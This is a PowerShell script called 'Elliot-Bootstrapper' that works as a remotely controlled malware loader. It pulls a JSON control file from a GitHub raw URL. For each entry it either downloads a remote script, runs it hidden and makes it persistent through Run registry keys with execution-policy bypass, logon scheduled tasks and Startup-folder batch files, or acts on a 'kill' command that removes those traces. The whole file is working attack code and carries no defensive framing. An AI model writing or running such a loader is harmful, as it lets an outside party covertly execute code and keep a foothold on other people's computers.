# Elliot-Bootstrapper.ps1
$controllerUrl = "https://raw.githubusercontent.com/Umair13303/Mr_Robox/refs/heads/main/StaticFile/Watcher_URL.json"

# Download JSON
try {
    $json = Invoke-RestMethod -Uri $controllerUrl -UseBasicParsing
} catch {
    exit
}

foreach ($item in $json) {
    if ($item.Status -eq "kill") {
        # ===== KILL SWITCH =====
        # Remove files
        foreach ($loc in $item.Location) {
            $p = [Environment]::ExpandEnvironmentVariables($loc)
            if (Test-Path $p) {
                Remove-Item -Path $p -Force -ErrorAction SilentlyContinue
            }
        }

        # Remove registry keys
        foreach ($rk in $item.Registery_Key) {
            Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $rk -ErrorAction SilentlyContinue
        }

        # Remove scheduled tasks
        foreach ($task in $item.Task_Name) {
            schtasks /delete /tn $task /f > $null 2>&1
        }

        # Remove shortcuts
        foreach ($sc in $item.ShortCut) {
            $shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$sc.bat"
            if (Test-Path $shortcutPath) {
                Remove-Item -Path $shortcutPath -Force -ErrorAction SilentlyContinue
            }
        }

        continue
    }

    if ($item.Status -eq "true") {
        # ===== DOWNLOAD SCRIPT =====
        try {
            $content = Invoke-WebRequest -Uri $item.Script_URL -UseBasicParsing | Select-Object -ExpandProperty Content
        } catch {
            continue
        }

        # ===== SAVE SCRIPT TO LOCATIONS =====
        foreach ($loc in $item.Location) {
            $p = [Environment]::ExpandEnvironmentVariables($loc)
            Set-Content -Path $p -Value $content -Force

            # ===== Run Immediately =====
            Start-Process -FilePath $p -WindowStyle Hidden
        }

        # ===== REGISTRY RUN KEYS =====
        foreach ($rk in $item.Registery_Key) {
            $command = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$p`""
            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $rk -Value $command -Force
        }

        # ===== SCHEDULED TASKS =====
        foreach ($task in $item.Task_Name) {
            schtasks /query /tn $task > $null 2>&1
            if ($LASTEXITCODE -ne 0) {
                schtasks /create /tn $task /sc ONLOGON /tr $command /f > $null 2>&1
            }
        }

        # ===== STARTUP SHORTCUTS =====
        foreach ($sc in $item.ShortCut) {
            $shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$sc.bat"
            Set-Content -Path $shortcutPath -Value $command -Force
        }
    }
}
